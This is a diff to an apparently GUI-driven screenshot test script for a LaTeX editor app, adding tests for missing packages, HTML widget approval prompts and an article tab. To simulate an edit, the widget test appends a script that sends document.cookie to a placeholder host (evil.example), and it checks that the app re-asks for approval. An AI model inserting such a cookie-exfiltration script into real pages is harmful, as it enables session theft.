@@ -14,8 +14,8 @@ probes measure that case.
 
 Env: STILLS_OUT (stills dir), STILLS_HOME (contained home, reusable so the
 engine cache survives), STILLS_DISPLAY (:99), STILLS_PORT (vite, 1420),
-STILLS_STATES (default "1 2 3 4 5 6 7 8 9"; 10 is the opt-in worker-failure
-proof), STILLS_MIRROR_PORT /
+STILLS_STATES (default "1 2 3 4 5 6 7 8 9 10 11"; 12 is the opt-in
+worker-failure proof, 13 the opt-in article-tab proof), STILLS_MIRROR_PORT /
 STILLS_MIRROR_CACHE / STILLS_COLD_ONLINE (state 4's bundle host).
 """
 import atexit
@@ -32,6 +32,7 @@ import time
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 import harness  # noqa: E402
 from harness import AppLog, Procs, now_ms, xdo  # noqa: E402
+import templates  # noqa: E402
 
 HERE = os.path.dirname(os.path.abspath(__file__))
 ROOT = os.path.dirname(HERE)
@@ -42,7 +43,7 @@ OUT = os.environ.get("STILLS_OUT") or tempfile.mkdtemp(prefix="maleficium-stills
 FAKEHOME = os.environ.get("STILLS_HOME") or tempfile.mkdtemp(prefix="maleficium-stills-home-", dir="/tmp")
 DISP = os.environ.get("STILLS_DISPLAY", ":99")
 PORT = int(os.environ.get("STILLS_PORT", "1420"))
-STATES = os.environ.get("STILLS_STATES", "1 2 3 4 5 6 7 8 9").split()
+STATES = os.environ.get("STILLS_STATES", "1 2 3 4 5 6 7 8 9 10 11").split()
 
 os.makedirs(OUT, exist_ok=True)
 os.makedirs(FAKEHOME, exist_ok=True)
@@ -745,8 +746,10 @@ def state7():
     shot("07-portrait")
     stop_app()
     portrait = APPLOG.events()
-    os.makedirs(FIX + "/beamer", exist_ok=True)
-    shutil.copy(ROOT + "/src-tauri/templates/beamer/main.tex", FIX + "/beamer/main.tex")
+    # The beamer template as the app instantiates it (shared overlays and
+    # all); the bare folder alone cannot compile.
+    shutil.rmtree(FIX + "/beamer", ignore_errors=True)
+    templates.materialize("beamer", FIX + "/beamer")
     open_compiled(FIX + "/beamer", "beamer")
     shot("07-beamer-open")
     mark("beamer-scroll")
@@ -799,8 +802,9 @@ def state7():
     if p1 and "width" in p1[0]:
         aspect = p1[0]["width"] / p1[0]["height"]
         print("stills: beamer page 1 backing %dx%d (aspect %.3f)" % (p1[0]["width"], p1[0]["height"], aspect))
-        if not 1.30 < aspect < 1.37:
-            bad.append("beamer page 1 must render at its 4:3 aspect")
+        # The beamer template declares aspectratio=169, so 16:9 it is.
+        if not 1.74 < aspect < 1.81:
+            bad.append("beamer page 1 must render at its 16:9 aspect")
     if bad:
         die("preview render counts are off (table above): " + "; ".join(bad))
     print("stills: render counts ok")
@@ -994,14 +998,14 @@ def state9():
           "keep-mine saved" % len(held))
 
 
-def state10():
+def state12():
     """Worker failure: with the pdf.js worker URL broken at the vite layer,
     opening a compiled project emits preview.load-failed once and the
     preview renders its error branch instead of hanging. Opt-in
-    (STILLS_STATES=10): the break flag stays out of every other state."""
+    (STILLS_STATES=12): the break flag stays out of every other state."""
     breakfile = os.environ.get("STILLS_BREAK_PDF_WORKER") or os.path.join(OUT, ".break-worker")
     log("pre-warming engine cache via driver")
-    if not run_driver("driver-warm10.jsonl", 150, FIX + "/simple"):
+    if not run_driver("driver-warm12.jsonl", 150, FIX + "/simple"):
         die("warm driver failed")
     with open(breakfile, "w") as f:
         f.write("pdf.worker\n")
@@ -1017,7 +1021,7 @@ def state10():
         # starts at launch: a preview open before the recompile counts.
         wait_event("preview.load-failed", mstate, 60)
         time.sleep(2)
-        shot("10-worker-failed")
+        shot("12-worker-failed")
         stop_app()
     finally:
         if os.path.isfile(breakfile):
@@ -1031,6 +1035,317 @@ def state10():
 
 
 # ---- run --------------------------------------------------------------------
+
+
+def state10():
+    """A package the project lacks is an error that names it. A copy of the
+    playground without maleficium-interactive.sty fails on Ctrl+R with the
+    file named and the hint to add it to the project folder; the pre-compile
+    check warns about it too. Once the file is in the project folder (an
+    ordinary project file, as a template-made project has it) the next
+    compile succeeds. The app writes nothing into the project."""
+    proj = FIX + "/interactive"
+    shutil.copytree(ROOT + "/e2e/fixtures/playground", proj)
+    sty = proj + "/maleficium-interactive.sty"
+    if os.path.exists(sty):
+        os.remove(sty)
+    shipped = ROOT + "/embed-runtime/tex/maleficium-interactive.sty"
+    start_app(proj)
+    wait_window(300)
+    window_size(1600, 900)
+    open_project()
+    click_editor()
+    # The first compile fails on the missing package (and caches the bundle
+    # index); the second then warns before compiling.
+    m_miss = now_ms()
+    key("ctrl+r")
+    wait_event("compile.missing", m_miss, 300)
+    wait_event("compile.finish", m_miss, 300)
+    shot("10-interactive-compile-error")
+    click_editor()
+    m_warn = now_ms()
+    key("ctrl+r")
+    wait_event("compile.precheck", m_warn, 120)
+    wait_event("compile.finish", m_warn, 300)
+    if os.path.exists(sty):
+        die("the compile wrote the package into the project")
+    shot("10-interactive-missing")
+    shutil.copy(shipped, sty)
+    time.sleep(2)
+    click_editor()
+    m_ok = now_ms()
+    key("ctrl+r")
+    wait_event("compile.finish", m_ok, 300)
+    time.sleep(1)
+    stop_app()
+
+    evs = APPLOG.events()
+    miss = [e["event"] for e in evs if isinstance(e.get("event"), dict) and e["event"].get("action") == "compile.missing" and e["at"] > m_miss]
+    if not miss or miss[0].get("file") != "maleficium-interactive.sty" or miss[0].get("reason") != "not-in-bundle":
+        die("the missing package was not named: %s" % miss[:1])
+    msgs = [e.get("message", "") for e in evs if e.get("at", 0) > m_miss and "maleficium-interactive.sty is not in the TeX bundle" in e.get("message", "")]
+    if not any("add it to your project folder" in m for m in msgs):
+        die("no event carried the add-it-to-your-project-folder hint: %s" % msgs[:2])
+    fin = [e["event"] for e in evs if isinstance(e.get("event"), dict) and e["event"].get("action") == "compile.finish" and e["at"] > m_ok]
+    if not fin or fin[0].get("ok") is not True:
+        die("the compile with the package in the project failed: %s" % fin[:1])
+    print("stills: a missing package is named with the project-folder hint; with the file in the project it compiles")
+
+
+def widget_events(since):
+    return [e["event"] for e in APPLOG.events()
+            if isinstance(e.get("event"), dict) and e["at"] > since
+            and e["event"].get("action") in ("widget.approved", "widget.revoked", "widgets.auto-approve")]
+
+
+def store_value(field):
+    """A field of the project's approval store, read from the contained app data."""
+    base = os.path.join(FAKEHOME, ".local", "share", IDENT, "maleficium-widgets", "approvals")
+    for d in os.listdir(base):
+        with open(os.path.join(base, d, "store.json")) as f:
+            return json.load(f)[field]
+    die("no approval store under " + base)
+
+
+def open_widgets(still=None):
+    """View > Widgets through the command palette, matched by its menu path."""
+    key("ctrl+shift+p")
+    time.sleep(2)
+    click_at(800, 91)
+    time.sleep(1)
+    xdo(DISP, "type", "--delay", "40", "view widgets")
+    time.sleep(2)
+    if still:
+        shot(still)
+    xdo(DISP, "key", "Return")
+    time.sleep(3)
+
+
+def top_band(name):
+    """Mean luminance of a still's top band (toolbar and tabs, never under a
+    dialog's paper): a modal's backdrop dims it."""
+    from PIL import Image, ImageStat
+    im = Image.open(os.path.join(OUT, name + ".png")).convert("L")
+    return ImageStat.Stat(im.crop((0, 0, im.width, 80))).mean[0]
+
+
+def expect_prompt(name, base, shown):
+    """A still with the approval prompt up is dimmed by its backdrop; one
+    without matches the undimmed baseline."""
+    v = top_band(name)
+    log("%s: top band %.1f (baseline %.1f)" % (name, v, base))
+    if shown and not v < base * 0.8:
+        die("%s: no approval prompt in front of the window (top band %.1f, baseline %.1f)" % (name, v, base))
+    if not shown and not v > base * 0.9:
+        die("%s: something modal is still up (top band %.1f, baseline %.1f)" % (name, v, base))
+
+
+def compile_asking(since, cause, digest=None):
+    """Ctrl+R; returns the widget.approval-required the compile put on the bus."""
+    click_editor()
+    key("ctrl+r")
+    wait_event("compile.finish", since, 300)
+    e = APPLOG.wait("widget.approval-required", since, 30,
+                    lambda ev: ev.get("path") == "widgets/demo")
+    if not e:
+        die("the compile put no widget.approval-required for widgets/demo on the bus")
+    ev = e["event"]
+    if ev.get("cause") != cause or (digest and ev.get("digest") != digest):
+        die("approval-required: want cause %s digest %s, got %s" % (cause, digest, ev))
+    time.sleep(3)
+    return ev
+
+
+def state11():
+    """An html widget the user never approved: the first compile raises the
+    Approve | Skip prompt; Skip dismisses it and a recompile of the same
+    version asks nothing. Then View > Widgets walks pending -> approved ->
+    changed (an edit on disk, with the diff shown); the next compile asks
+    about the edited version and Approve in the prompt approves it; the
+    panel revokes it and turns the project's auto-approval on and off. The
+    prompt's presence is read from the stills (its backdrop dims the
+    window), every user action from the event the backend logs."""
+    proj = FIX + "/widgets"
+    shutil.copytree(ROOT + "/e2e/fixtures/interactive", proj)
+    for f in os.listdir(proj):
+        if f.endswith(".tex") and f != "main.tex":
+            os.remove(os.path.join(proj, f))
+    shutil.copy(ROOT + "/embed-runtime/tex/maleficium-interactive.sty", proj)
+    page = proj + "/widgets/demo/index.html"
+    start_app(proj)
+    wait_window(300)
+    window_size(1600, 900)
+    open_project()
+    click_editor()
+    shot("11-widgets-before")
+    base = top_band("11-widgets-before")
+
+    # First compile: the never-approved widget is asked about.
+    m0 = now_ms()
+    first = compile_asking(m0, "never_approved")
+    shot("11-widgets-prompt")
+    expect_prompt("11-widgets-prompt", base, True)
+    # The dialog holds focus; its first button is Skip.
+    key("Tab")
+    key("Return")
+    time.sleep(2)
+    shot("11-widgets-prompt-skipped")
+    expect_prompt("11-widgets-prompt-skipped", base, False)
+
+    # Recompile, nothing changed: the bus hears the same version, the user is
+    # not asked again.
+    compile_asking(now_ms(), "never_approved", first["digest"])
+    shot("11-widgets-recompile")
+    expect_prompt("11-widgets-recompile", base, False)
+    if widget_events(m0):
+        die("Skip logged an approval action: %s" % widget_events(m0))
+
+    m1 = now_ms()
+    open_widgets("11-widgets-palette")
+    shot("11-widgets-pending")
+    # Focus order in the open dialog: the auto switch, Review source, Approve.
+    key("Tab")
+    key("Tab")
+    key("Tab")
+    shot("11-widgets-pending-focus")
+    key("Return")
+    wait_event("widget.approved", m1, 30)
+    time.sleep(2)
+    shot("11-widgets-approved")
+    # The agent's edit lands on disk; reopening the panel reads the folder again.
+    with open(page, "a") as f:
+        f.write("<script>fetch('https://evil.example/' + document.cookie)</script>\n")
+    key("Escape")
+    time.sleep(1)
+    open_widgets()
+    shot("11-widgets-changed")
+    key("Tab")
+    key("Tab")
+    key("Return")
+    time.sleep(3)
+    shot("11-widgets-diff")
+    key("Escape")
+    time.sleep(1)
+
+    # The next compile asks about the edited version; Approve in the prompt
+    # approves exactly that one.
+    m2 = now_ms()
+    edited = compile_asking(m2, "changed_since_approval")
+    if edited["digest"] == first["digest"]:
+        die("the edit did not change the widget's digest")
+    shot("11-widgets-reprompt")
+    expect_prompt("11-widgets-reprompt", base, True)
+    key("Tab")
+    key("Tab")
+    key("Return")
+    e = APPLOG.wait("widget.approved", m2, 30)
+    if not e:
+        die("Approve in the prompt logged no widget.approved")
+    if e["event"].get("digest") != edited["digest"]:
+        die("the prompt approved %s, not the edited version %s" % (e["event"], edited["digest"]))
+    time.sleep(2)
+    shot("11-widgets-prompt-approved")
+    expect_prompt("11-widgets-prompt-approved", base, False)
+    m3 = now_ms()
+    compile_asking_none(m3)
+
+    # The panel shows it approved: focus goes the auto switch, then Revoke
+    # (Approve is disabled).
+    open_widgets()
+    shot("11-widgets-approved-panel")
+    key("Tab")
+    key("Tab")
+    key("Return")
+    wait_event("widget.revoked", m3, 30)
+    time.sleep(2)
+    shot("11-widgets-revoked")
+    # The switch (the review is gone, so the layout is the short one).
+    m_on = now_ms()
+    click_at(407, 347)
+    wait_event("widgets.auto-approve", m_on, 30)
+    time.sleep(2)
+    if store_value("autoApprove") is not True:
+        die("auto-approval is not persisted as on in the approval store")
+    shot("11-widgets-auto-on")
+    m_off = now_ms()
+    click_at(407, 347)
+    wait_event("widgets.auto-approve", m_off, 30)
+    time.sleep(2)
+    if store_value("autoApprove") is not False:
+        die("auto-approval is not persisted as off in the approval store")
+    stop_app()
+    acts_seen = [(e["action"], e.get("on")) for e in widget_events(m0)]
+    want = [("widget.approved", None), ("widget.approved", None), ("widget.revoked", None),
+            ("widgets.auto-approve", True), ("widgets.auto-approve", False)]
+    if acts_seen != want:
+        die("widget events: %s" % acts_seen)
+    widget = store_value("widgets")["widgets/demo"]
+    if widget["revoked"] is not True:
+        die("the revoke is not in the approval store")
+    print("stills: approval prompt raised by the first compile, skipped, not raised again for the same version, "
+          "raised again after an edit and approved from the prompt; widgets panel walked pending, approved, "
+          "changed (diff shown), revoked; auto-approval on and off persisted; events %s" % acts_seen)
+
+
+def state13():
+    """Article tab: the multi-section fixture compiles, the Article tab's
+    first visit loads the reader bytes (article.load on the bus) and the
+    still shows the article, then a forward-sync jump from the end of the
+    editor scrolls the tab to the caret's section (article.sync on the
+    bus). Opt-in (STILLS_STATES=13): needs the engine cache warm, so it
+    pre-warms through the driver like state 2."""
+    log("pre-warming engine cache via driver")
+    if not run_driver("driver-warm13.jsonl", 150, FIX + "/simple"):
+        die("warm driver failed")
+    start_app(FIX + "/simple")
+    wait_window(300)
+    window_size(1600, 900)
+    # From before the open: the warm auto-compile finishes about a second
+    # after file.open, so a timestamp taken later would miss it entirely.
+    m = now_ms()
+    open_project()
+    click_editor()
+    # The open auto-compiles warm; one measured Ctrl+R after it settles.
+    wait_event("compile.finish", m, 300)
+    m = now_ms()
+    key("ctrl+r")
+    wait_event("compile.finish", m, 300)
+    wait_event("preview.page-render", m, 120)
+    # First visit to the Article tab loads the bundle (the Reload control
+    # stays off while compiling, so this runs settled). Two tab spots: the
+    # preview column's offset moves with the layout, the load event says
+    # which one landed.
+    click_at(1170, 68)
+    time.sleep(2)
+    if not seen("article.load", m):
+        click_at(1250, 68)
+        time.sleep(2)
+    wait_event("article.load", m, 120)
+    time.sleep(2)
+    shot("13-article-tab")
+    # Caret to the end of the paper, then forward sync: the tab must follow
+    # to the caret's section.
+    click_editor()
+    key("ctrl+End")
+    msync = now_ms()
+    key("ctrl+alt+j")
+    wait_event("article.sync", msync, 60)
+    time.sleep(2)
+    shot("13-article-synced")
+    stop_app()
+    check_log("log.open compile.finish preview.pdf-load preview.page-render article.load article.sync")
+    print("stills: article tab loaded its reader bytes on first visit and forward sync scrolled it to the caret section")
+
+
+def compile_asking_none(since):
+    """Ctrl+R on an approved widget: the compile asks nothing."""
+    click_editor()
+    key("ctrl+r")
+    wait_event("compile.finish", since, 300)
+    time.sleep(2)
+    if APPLOG.find("widget.approval-required", since):
+        die("a compile asked about an approved widget")
+    shot("11-widgets-approved-recompile")
 
 
 def main():
@@ -1067,7 +1382,7 @@ def main():
     # dev build `tauri dev` runs (no custom-protocol) and builds maleficium-mcp
     # too (State 2's driver runs it).
     open(PRESET, "w").close()
-    # The worker-break flag for state 10: the path rides to vite, which 404s
+    # The worker-break flag for state 12: the path rides to vite, which 404s
     # the pdf.js worker only while the file exists. Absent everywhere else.
     os.environ.setdefault("STILLS_BREAK_PDF_WORKER", os.path.join(OUT, ".break-worker"))
     target = os.environ.get("CARGO_TARGET_DIR") or os.path.join(ROOT, "src-tauri", "target")
@@ -1080,7 +1395,7 @@ def main():
                        os.environ.get("VITE_CACHE_DIR", os.path.join(ROOT, "node_modules", ".vite")), log)
     log("vite serving on :%d" % PORT)
 
-    for n in range(1, 11):
+    for n in range(1, 14):
         if want(n):
             globals()["state%d" % n]()
     log("stills in %s:" % OUT)
